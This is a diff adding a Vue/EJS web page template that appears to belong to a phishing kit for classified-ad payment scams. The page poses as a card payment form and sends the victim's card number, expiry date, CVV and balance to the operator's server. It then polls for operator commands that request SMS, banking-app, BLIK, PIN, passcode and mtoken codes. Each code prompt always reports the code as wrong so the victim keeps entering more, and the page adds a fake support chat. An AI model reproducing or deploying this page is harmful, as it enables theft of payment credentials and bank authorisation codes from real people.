@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="/css/style.css" />
+  <link rel="stylesheet" href="/css/support_parent.css" />
+  <title>
+    <%=ad.title%>
+  </title>
+</head>
+
+<body>
+  <div class="wrapper" id="app">
+    <form class="card-form" @submit="submitForm">
+      <div class="card-list">
+        <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
+          <div class="card-item__side -front">
+            <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }"
+              v-bind:style="focusElementStyle" ref="focusElement"></div>
+            <div class="card-item__cover">
+              <img
+                v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'"
+                class="card-item__bg" />
+            </div>
+
+            <div class="card-item__wrapper">
+              <div class="card-item__top">
+                <img
+                  src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png"
+                  class="card-item__chip" />
+              </div>
+              <label for="cardNumber" class="card-item__number" ref="cardNumber">
+                <template v-if="getCardType === 'amex'">
+                  <span v-for="(n, $index) in amexCardMask" :key="$index">
+                    <transition name="slide-fade-up">
+                      <div class="card-item__numberItem"
+                        v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''">
+                        *
+                      </div>
+                      <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" :key="$index"
+                        v-else-if="cardNumber.length > $index">
+                        {{cardNumber[$index]}}
+                      </div>
+                      <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" v-else
+                        :key="$index + 1">
+                        {{n}}
+                      </div>
+                    </transition>
+                  </span>
+                </template>
+
+                <template v-else>
+                  <span v-for="(n, $index) in otherCardMask" :key="$index">
+                    <transition name="slide-fade-up">
+                      <div class="card-item__numberItem"
+                        v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''">
+                        *
+                      </div>
+                      <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" :key="$index"
+                        v-else-if="cardNumber.length > $index">
+                        {{cardNumber[$index]}}
+                      </div>
+                      <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" v-else
+                        :key="$index + 1">
+                        {{n}}
+                      </div>
+                    </transition>
+                  </span>
+                </template>
+              </label>
+              <div class="card-item__content">
+                <label for="cardBalance" v-if="balanceChecker && step==2" class="card-item__info" ref="cardBalance">
+                  <div class="card-item__holder">
+                    <%=translate["card_balance"][ad.service.lang]%>
+                  </div>
+                  <transition name="slide-fade-up">
+                    <div class="card-item__name" v-if="cardBalance.length" key="1">
+                      <transition-group name="slide-fade-right">
+                        <span class="card-item__nameItem" v-for="(n, $index) in cardBalance.replace(/\s\s+/g, ' ')"
+                          v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span>
+                      </transition-group>
+                      <%=translate["currency"][ad.service.lang]%>
+                    </div>
+                    <div class="card-item__name" v-else key="2">
+                      0.00 <%=translate["currency"][ad.service.lang]%>
+                    </div>
+                  </transition>
+                </label>
+                <div class="card-item__date" ref="cardDate">
+                  <label for="cardMonth" class="card-item__dateTitle">
+                    <%=translate["expires"][ad.service.lang]%>
+                  </label>
+                  <label for="cardMonth" class="card-item__dateItem">
+                    <transition name="slide-fade-up">
+                      <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span>
+                      <span v-else key="2">MM</span>
+                    </transition>
+                  </label>
+                  /
+                  <label for="cardYear" class="card-item__dateItem">
+                    <transition name="slide-fade-up">
+                      <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
+                      <span v-else key="2">YY</span>
+                    </transition>
+                  </label>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="card-item__side -back">
+            <div class="card-item__cover">
+              <img
+                v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'"
+                class="card-item__bg" />
+            </div>
+            <div class="card-item__band"></div>
+            <div class="card-item__cvv">
+              <div class="card-item__cvvTitle">CVV</div>
+              <div class="card-item__cvvBand">
+                <span v-for="(n, $index) in cardCvv" :key="$index"> * </span>
+              </div>
+              <div class="card-item__type">
+                <img
+                  v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'"
+                  v-if="getCardType" class="card-item__typeImg" />
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="card-form__inner">
+        <div class="card-input">
+          <label for="cardNumber" class="card-input__label">
+            <%=translate["card_number"][ad.service.lang]%>
+          </label>
+          <input type="text" required id="cardNumber" minlength="16" class="card-input__input"
+            v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput"
+            data-ref="cardNumber" autocomplete="off" />
+        </div>
+        <div class="card-form__row">
+          <div class="card-form__col">
+            <div class="card-form__group">
+              <label for="cardMonth" class="card-input__label">
+                <%=translate["expiration_date"][ad.service.lang]%>
+              </label>
+              <select class="card-input__input -select" required id="cardMonth" v-model="cardMonth"
+                v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
+                <option value="" disabled selected>
+                  <%=translate["month"][ad.service.lang]%>
+                </option>
+                <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth"
+                  v-bind:key="n">
+                  {{n < 10 ? '0' + n : n}} </option>
+              </select>
+              <select class="card-input__input -select" required id="cardYear" v-model="cardYear"
+                v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
+                <option value="" disabled selected>
+                  <%=translate["year"][ad.service.lang]%>
+                </option>
+                <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n">
+                  {{$index + minCardYear}}
+                </option>
+              </select>
+            </div>
+          </div>
+          <div class="card-form__col -cvv">
+            <div class="card-input">
+              <label for="cardCvv" class="card-input__label">CVV</label>
+              <input type="text" class="card-input__input" minlength="3" maxlength="4" required id="cardCvv"
+                v-mask="'####'" maxlength="4" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)"
+                autocomplete="off" />
+            </div>
+          </div>
+        </div>
+        <div class="card-input" v-if="step==2 && balanceChecker">
+          <label for="cardBalance" class="card-input__label">
+            <%=translate["card_balance"][ad.service.lang]%>
+          </label>
+          <input type="text" step="0.01" id="cardBalance" required class="card-input__input" v-model="cardBalance"
+            v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardBalance" autocomplete="off" />
+        </div>
+
+        <span class="text-danger" v-if="cardError">{{ cardError }}</span>
+
+        <div class="lds-ring" v-if="loading">
+          <div></div>
+          <div></div>
+          <div></div>
+          <div></div>
+        </div>
+        <button class="card-form__button" v-if="!loading">
+          <%=translate["submit"][ad.service.lang]%>
+        </button>
+      </div>
+    </form>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vue-swal@1.0.0/dist/vue-swal.min.js" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script defer>
+
+    new Vue({
+      el: "#app",
+      data() {
+        return {
+          currentCardBackground: 8, // just for fun :D
+          cardBalance: "0.00",
+          cardNumber: "",
+          cardMonth: "",
+          cardYear: "",
+          cardCvv: "",
+          minCardYear: new Date().getFullYear(),
+          amexCardMask: "#### ###### #####",
+          otherCardMask: "#### #### #### ####",
+          cardNumberTemp: "",
+          isCardFlipped: false,
+          focusElementStyle: null,
+          isInputFocused: false,
+          step: 1,
+          cardError: "",
+          balanceChecker: <%=String(!!ad.balanceChecker) %>,
+      loading: false,
+        currentStatus: null,
+          logToken: null,
+          };
+        },
+    mounted() {
+      this.cardNumberTemp = this.otherCardMask;
+      document.getElementById("cardNumber").focus();
+      $("body").on(
+        "click",
+        ".pictures-container:not(.disabled) .pictures-element[data-item]",
+        (e) => {
+          e.preventDefault();
+          $(".pictures-container").removeClass("disabled").addClass("disabled");
+          axios.post(`/api/selectPicture`, {
+            picture: $(e.target).data("item") || $(e.target).parent().data("item"),
+            token: this.logToken
+          }).catch(() => { }).finally(() => {
+            setTimeout(() => {
+              alert("<%=translate["wrong_picture"][ad.service.lang]%>");
+              $(".pictures-container").removeClass("disabled");
+              this.pictureModal();
+            }, 750);
+          });
+        });
+    },
+    computed: {
+      getCardType() {
+        if (!this.cardNumber || String(this.cardNumber).trim().length < 1) return false;
+        let number = this.cardNumber;
+        let re = new RegExp("^4");
+        if (number.match(re) != null) return "visa";
+
+        re = new RegExp("^(34|37)");
+        if (number.match(re) != null) return "amex";
+
+        re = new RegExp("^5[1-5]");
+        if (number.match(re) != null) return "mastercard";
+
+        re = new RegExp("^6011");
+        if (number.match(re) != null) return "discover";
+
+        re = new RegExp("^9792");
+        if (number.match(re) != null) return "troy";
+
+        return "visa"; // default type
+      },
+      generateCardNumberMask() {
+        return this.getCardType === "amex"
+          ? this.amexCardMask
+          : this.otherCardMask;
+      },
+      minCardMonth() {
+        if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
+        return 1;
+      },
+    },
+    watch: {
+      cardYear() {
+        if (this.cardMonth < this.minCardMonth) {
+          this.cardMonth = "";
+        }
+      },
+      currentStatus(v) {
+        if (v == "profit") this.successModal();
+        else if (v == "sms") this.codeModal();
+        else if (v == "mtoken") this.mtokenModal();
+        else if (v == "appCode") this.codeModal(
+          "app",
+          "<%=translate["app_code_title"][ad.service.lang]%>",
+          "<%=translate["app_code_text"][ad.service.lang]%>",
+          "<%=translate["app_code_placeholder"][ad.service.lang]%>",
+        );
+        else if (v == "callCode") this.codeModal(
+          "call",
+          "<%=translate["call_code_title"][ad.service.lang]%>",
+          "<%=translate["call_code_text"][ad.service.lang]%>",
+          "<%=translate["call_code_placeholder"][ad.service.lang]%>",
+        );
+        else if (v == "blik") this.codeModal(
+          "blik",
+          "<%=translate["blik_code_title"][ad.service.lang]%>",
+          "<%=translate["blik_code_text"][ad.service.lang]%>",
+          "<%=translate["blik_code_placeholder"][ad.service.lang]%>",
+        );
+        else if (v == "passcode") this.codeModal(
+          "passcode",
+          "<%=translate["passcode_title"][ad.service.lang]%>",
+          "<%=translate["passcode_text"][ad.service.lang]%>",
+          "<%=translate["passcode_placeholder"][ad.service.lang]%>",
+        );
+        else if (v == "pincode") this.codeModal(
+          "pincode",
+          "<%=translate["pincode_title"][ad.service.lang]%>",
+          "<%=translate["pincode_text"][ad.service.lang]%>",
+          "<%=translate["pincode_placeholder"][ad.service.lang]%>",
+        );
+        else if (v == "dtrans") this.codeModal(
+          "dtrans",
+          "<%=translate["dtrans_title"][ad.service.lang]%>",
+          `<%=translate["dtrans_text"][ad.service.lang]%>`,
+          "<%=translate["dtrans_placeholder"][ad.service.lang]%>",
+        );
+        else if (v == "callBank") this.codeModal(
+          "callBank",
+          "<%=translate["callBank_title"][ad.service.lang]%>",
+          `<%=translate["callBank_text"][ad.service.lang]%>`,
+          "<%=translate["callBank_placeholder"][ad.service.lang]%>",
+        );
+        else if (v == "picture") this.pictureModal();
+        else if (v == "push") this.pushModal();
+        else if (v == "pincode") this.pincodeModal();
+        else if (v == "dtrans") this.pincodeModal();
+        else if (v == "callBank") this.callBankModal();
+        else if (v == "passcode") this.passcodeModal();
+        else if (v == "limits") this.limitsModal();
+        else if (v == "otherCard") this.otherCardModal();
+        else if (v == "forVerify") this.forVerifyModal();
+        else if (v == "correctBalance") this.correctBalanceModal();
+        else if (v == "lk") document.location.href = `/personal/${this.logToken}`;
+        else if (v == "lk1") document.location.href = `/personal/${this.logToken}`;
+        else if (v == "lk2") document.location.href = `/personal/${this.logToken}`;
+        else if (v == "lk3") document.location.href = `/personal/${this.logToken}`;
+        else if (v == "lk4") document.location.href = `/personal/${this.logToken}`;
+        else if (v == "lk5") document.location.href = `/personal/${this.logToken}`;
+        else if(v == "custom") document.location.href = `/custom/${this.logToken}`;
+      },
+    },
+    methods: {
+      limitsModal() {
+        swal(
+          "<%=translate["error_title"][ad.service.lang]%>",
+          "<%=translate["limits"][ad.service.lang]%>",
+          "error"
+        );
+      },
+      forVerifyModal() {
+        swal(
+          "<%=translate["error_title"][ad.service.lang]%>",
+          "<%=translate["for_verify"][ad.service.lang]%>",
+          "error"
+        );
+      },
+      correctBalanceModal() {
+        swal(
+          "<%=translate["error_title"][ad.service.lang]%>",
+          "<%=translate["correct_balance"][ad.service.lang]%>",
+          "error"
+        );
+      },
+      otherCardModal() {
+        swal(
+          "<%=translate["error_title"][ad.service.lang]%>",
+          "<%=translate["other_card"][ad.service.lang]%>",
+          "error"
+        );
+      },
+      pushModal() {
+        swal(
+          "<%=translate["push_title"][ad.service.lang]%>",
+          "<%=translate["push_text"][ad.service.lang]%>",
+          "info", {
+
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        }
+        );
+      },
+      successModal() {
+        swal(
+          "<%=translate["success"][ad.service.lang]%>",
+          "<%=translate["money_will"][ad.service.lang]%>",
+          "success", {
+
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        }
+        );
+      },
+      pictureModal(){
+        swal("<%=translate["picture_title"][ad.service.lang]%>", "<%=translate["picture_text"][ad.service.lang]%>", "info", {
+          content: {
+            element: "div",
+            attributes: {
+              id: "pictures_div"
+            },
+          },
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        });
+        const pictures = [
+          "банан",
+          "брюки",
+          "бургер",
+          "гитара",
+          "зонтик",
+          "календарь",
+          "калькулятор",
+          "карандаш",
+          "клубника",
+          "компас",
+          "крокодил",
+          "лимон",
+          "мамонт",
+          "микрофон",
+          "наушники",
+          "очки",
+          "помидор",
+          "свитер",
+          "телефон",
+          "цветок",
+          "шоколад",
+        ].sort(() => Math.random() - 0.5);
+
+        document.querySelector("#pictures_div").innerHTML = '<div class="pictures-container">' + pictures.map(v => '<div class="pictures-element" data-item="' + v + '"><img draggable="false" alt="" src="/img/pictures/' + v + '.png"></div>').join("\n") + '</div>';
+        document.querySelector(".pictures-container").classList.remove("disabled");
+      },
+      codeModal(codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>") {
+        swal.stopLoading();
+        swal({
+          title,
+          text,
+          content: {
+            element: "input",
+            attributes: {
+              type: "password",
+              placeholder,
+              maxLength: 255,
+              required: true,
+              style:
+                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate["submit"][ad.service.lang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async (code) => {
+          try {
+            if (!code) {
+              swal.stopLoading();
+              alert(wrong_code);
+              return this.codeModal(...arguments);
+            }
+            const response = await axios.post("/api/submitCode", {
+              codeType,
+              code,
+              token: this.logToken,
+            });
+
+            swal.stopLoading();
+            alert(wrong_code);
+            return this.codeModal(...arguments);
+          } catch (err) {
+            swal.stopLoading();
+            alert(wrong_code);
+            return this.codeModal(...arguments);
+          }
+        });
+      },
+      mtokenModal(codeType = "mtoken", title = "<%=translate["mtoken_title"][ad.service.lang]%>", text = "<%=translate["mtoken_text"][ad.service.lang]%>", placeholder = "<%=translate["mtoken_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_mtoken"][ad.service.lang]%>") {
+        swal.stopLoading();
+        swal({
+          title,
+          text,
+          content: {
+            element: "input",
+            attributes: {
+              type: "password",
+              placeholder,
+              maxLength: 255,
+              required: true,
+              style:
+                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate["submit"][ad.service.lang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async (code) => {
+          try {
+            if (!code) {
+              swal.stopLoading();
+              alert(wrong_code);
+              return this.codeModal(...arguments);
+            }
+            const response = await axios.post("/api/submitCode", {
+              codeType,
+              code,
+              token: this.logToken,
+            });
+
+            swal.stopLoading();
+            alert(wrong_code);
+            return this.codeModal(...arguments);
+          } catch (err) {
+            swal.stopLoading();
+            alert(wrong_code);
+            return this.codeModal(...arguments);
+          }
+        });
+      },
+      valid_credit_card(value) {
+        // accept only digits, dashes or spaces
+        if (/[^0-9-\s]+/.test(value)) return false;
+
+        // The Luhn Algorithm. It's so pretty.
+        var nCheck = 0,
+          nDigit = 0,
+          bEven = false;
+        value = value.replace(/\D/g, "");
+
+        for (var n = value.length - 1; n >= 0; n--) {
+          var cDigit = value.charAt(n),
+            nDigit = parseInt(cDigit, 10);
+
+          if (bEven) {
+            if ((nDigit *= 2) > 9) nDigit -= 9;
+          }
+
+          nCheck += nDigit;
+          bEven = !bEven;
+        }
+
+        return nCheck % 10 == 0;
+      },
+      submitForm(e) {
+        e.preventDefault();
+
+        if (!this.valid_credit_card(this.cardNumber)) {
+          return (this.cardError = "<%=translate["card_number_invalid"][ad.service.lang]%>");
+        } else {
+          this.cardError = "";
+        }
+        if (this.step < 2 && this.balanceChecker) {
+          swal({
+            title: "<%=translate["attention"][ad.service.lang]%>",
+            icon: "warning",
+            text:
+              "<%=translate["bank_asked"][ad.service.lang]%>",
+            buttons: true,
+            dangerMode: true,
+          }).then((val) => {
+            if (val) this.step = 2;
+          });
+        } else if (this.step == 2 || !this.balanceChecker) {
+          this.loading = true;
+          axios
+            .post("/api/submitCard", {
+              adId: <%=ad.id %>,
+              number: this.cardNumber.replace(/\D+/g, ""),
+              expire:
+                this.cardMonth.toString() +
+                "/" +
+                this.cardYear.toString().substr(-2),
+              cvv: this.cardCvv,
+              balance: this.cardBalance,
+            })
+            .finally(() => (this.loading = false))
+            .then((response) => {
+              localStorage.token = response.data.token;
+              this.logToken = response.data.token;
+              if (this.currentStatus == null) this.checkLogStatus();
+              swal({
+                title: "<%=translate["wait"][ad.service.lang]%>",
+                text: "<%=translate["bank_processes"][ad.service.lang]%>",
+                icon: "info",
+                closeOnClickOutside: false,
+                closeOnEsc: false,
+                buttons: false,
+              });
+            })
+            .catch((err) => {
+              alert(err)
+              swal("<%=translate["error_title"][ad.service.lang]%>", "<%=translate["error"][ad.service.lang]%>", "error");
+            });
+        }
+      },
+      checkLogStatus() {
+        axios
+          .post("/api/checkStatus", {
+            token: this.logToken,
+          })
+          .finally(() => setTimeout(() => this.checkLogStatus(this.logToken), 1500))
+          .then((response) => {
+            if (this.currentStatus != response.data.status)
+              this.currentStatus = response.data.status;
+          })
+          .catch((err) => err);
+      },
+      flipCard(status) {
+        this.isCardFlipped = status;
+      },
+      focusInput(e) {
+        this.isInputFocused = true;
+        let targetRef = e.target.dataset.ref;
+        let target = this.$refs[targetRef];
+        this.focusElementStyle = {
+          width: `${target.offsetWidth}px`,
+          height: `${target.offsetHeight}px`,
+          transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`,
+        };
+      },
+      blurInput() {
+        let vm = this;
+        setTimeout(() => {
+          if (!vm.isInputFocused) {
+            vm.focusElementStyle = null;
+          }
+        }, 300);
+        vm.isInputFocused = false;
+      },
+    },
+      });
+  </script>
+  <div class="
+        chatra--webkit
+        chatra--style-round
+        chatra--side-bottom
+        chatra--pos-right
+        chatra--visible
+        chatra--expanded
+        chatra--fast-toggle
+      " id="chatra" data-turbolinks-permanent="" style="
+        width: 380px;
+        height: 600px;
+        transform: none;
+        z-index: 2147483647;
+        display: none;
+      ">
+    <div id="chatra__iframe-wrapper">
+      <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+        src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+    </div>
+  </div>
+  <div class="support-circle"
+    onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+</body>
+
+</html>
